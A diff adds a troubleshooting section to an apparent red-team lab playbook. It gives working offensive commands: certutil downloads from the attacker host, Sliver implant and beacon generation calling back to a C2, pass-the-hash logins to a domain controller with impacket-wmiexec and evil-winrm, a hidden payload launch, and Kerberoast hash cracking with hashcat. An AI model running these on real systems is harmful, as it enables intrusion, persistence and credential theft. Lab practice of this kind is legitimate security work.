@@ -75,6 +75,173 @@ make shell
 
 ---
 
+## Troubleshooting
+
+Quick reference for issues encountered during live execution of this playbook.
+
+### VMs are down or unreachable
+
+```bash
+[HOST]
+vagrant status          # shows which VMs are running / powered off
+make resume             # brings everything back up and re-applies routing + TCP fix
+```
+
+If a VM stays in `aborted` state: `vagrant destroy <NAME> && vagrant up <NAME>` — this re-provisions from scratch and takes ~20 min.
+
+---
+
+### iptables routing rules lost (Kali→Windows TCP works via ping, hangs for real traffic)
+
+iptables rules are not persistent — they reset on host reboot.
+
+```bash
+[HOST]
+sudo bash /home/andrey/dragonrx-lab/scripts/setup_routing.sh
+```
+
+`make resume` does this automatically. Also re-applies TX checksum offloading fix. Symptom: `ping` works, `nmap`/`nxc`/`wmiexec` time out.
+
+---
+
+### certutil fails: `12004 ERROR_WINHTTP_INTERNAL_ERROR`
+
+DC01 / FS01 / WS01 are only on `target_net` (192.168.10.0/24). They cannot reach Kali's attacker-net IP `10.0.0.5`. Always use Kali's **target_net NIC** for Windows downloads:
+
+```
+# Wrong — DC01 has no route to 10.0.0.0/24
+certutil.exe -urlcache -f http://10.0.0.5:8900/file.exe C:\Temp\file.exe
+
+# Correct
+certutil.exe -urlcache -f http://192.168.10.5:8900/file.exe C:\Temp\file.exe
+```
+
+---
+
+### Sliver HTTPS listener is missing (only HTTP on :80 in `jobs`)
+
+The entrypoint auto-start occasionally fails silently. Start it manually:
+
+```
+[C2]
+sliver > jobs
+sliver > https --lhost 0.0.0.0 --lport 443
+```
+
+Windows beacons are compiled for HTTPS — they will not connect to the HTTP listener on port 80.
+
+---
+
+### Sliver implant running on Windows but never checks in
+
+**Step 1 — Confirm HTTPS listener is up:** `sliver > jobs`
+
+**Step 2 — Confirm DC01 can reach C2:** `powershell -c "Test-NetConnection -ComputerName 10.0.0.10 -Port 443"`
+
+**Step 3 — Check server logs** (Sliver logs to file, not stdout):
+```bash
+docker exec dragonrx_c2 tail -50 /root/.sliver/logs/sliver-server.log
+```
+
+**Step 4 — If the pre-built `rxphage.exe` has a stale baked-in cert** (C2 volume was wiped and re-init'd after the builder ran), generate a fresh implant directly:
+```
+[C2]
+sliver > generate --os windows --arch amd64 --http https://10.0.0.10:443 --skip-symbols --save /tmp/fresh.exe
+```
+```bash
+docker cp dragonrx_c2:/tmp/fresh.exe /home/andrey/dragonrx-lab/attacker/tools/rxphage/fresh.exe
+```
+
+---
+
+### `start /b` process dies immediately under wmiexec
+
+wmiexec creates a temporary `cmd.exe` via WMI; children spawned with `start /b` are killed when that `cmd.exe` exits. Use `Start-Process` instead:
+
+```
+# Wrong
+start /b C:\Temp\payload.exe
+
+# Correct — creates a truly detached process
+powershell -c "Start-Process -FilePath 'C:\Temp\payload.exe' -WindowStyle Hidden"
+```
+
+Verify it survived: `powershell -c "Get-Process payload -ErrorAction SilentlyContinue | Select-Object Id,CPU"`
+
+---
+
+### smbexec on DC01 returns `STATUS_OBJECT_NAME_NOT_FOUND`
+
+Domain Controllers block the SCM named-pipe back-channel that smbexec uses. Use wmiexec or evil-winrm:
+
+```bash
+# wmiexec (WMI — works on DCs)
+impacket-wmiexec -hashes ':3e2883cab3222750f8c5766bd8f559d7' 'NOVATECH/Administrator@192.168.10.10'
+
+# evil-winrm (WinRM port 5985 — requires WinRM to be enabled)
+evil-winrm -i 192.168.10.10 -u Administrator -H 3e2883cab3222750f8c5766bd8f559d7
+```
+
+---
+
+### Sliver `generate beacon` fails with `exit status 1`
+
+Symbol obfuscation is memory-intensive. Add `--skip-symbols`:
+
+```
+sliver > generate beacon --os windows --arch amd64 --http https://10.0.0.10:443 \
+  --seconds 10 --jitter 3 --skip-symbols --save /tmp/beacon.exe
+```
+
+If it still fails, generate a session implant (simpler compile): replace `beacon` with nothing and drop `--seconds`/`--jitter`.
+
+---
+
+### Kerberoast hash not cracking (john/hashcat silently skips)
+
+impacket outputs `$krb5tgs$18$user$realm$*spn*\nhash` but hashcat expects `$krb5tgs$18$*user$realm$spn*\nhash`. Reformat:
+
+```bash
+python3 - <<'EOF'
+import re, sys
+data = open('/opt/loot/kerberoast.hash').read()
+fixed = re.sub(r'(\$krb5tgs\$\d+\$)([\w.]+\$[\w.]+\$)\*(.*?)\*\n', r'\1*\2\3*\n', data)
+open('/opt/loot/kerberoast_fixed.hash','w').write(fixed)
+EOF
+hashcat -m 19700 /opt/loot/kerberoast_fixed.hash /usr/share/wordlists/rockyou.txt
+```
+
+Mode is **19700** (AES256-CTS-HMAC-SHA1-96), not 13100 (RC4).
+
+---
+
+### hashcat: `No devices found / No OpenCL platforms`
+
+The Kali container needs GPU device passthrough. Verify `docker-compose.yml` has:
+
+```yaml
+kali:
+  devices:
+    - /dev/dri:/dev/dri
+  group_add:
+    - video
+```
+
+Then rebuild: `docker compose build kali && docker compose up -d kali`. Inside Kali: `hashcat -I` should list Intel OpenCL.
+
+---
+
+### WS01 NIC2 has no IP after reboot
+
+The Windows 10 NIC initialises slower than Server 2019. The Vagrantfile provisioner uses `run: "always"` with a retry loop to handle this. Force re-provision:
+
+```bash
+[HOST]
+vagrant provision WS01
+```
+
+---
+
 ## Network Reference Card
 
 ```
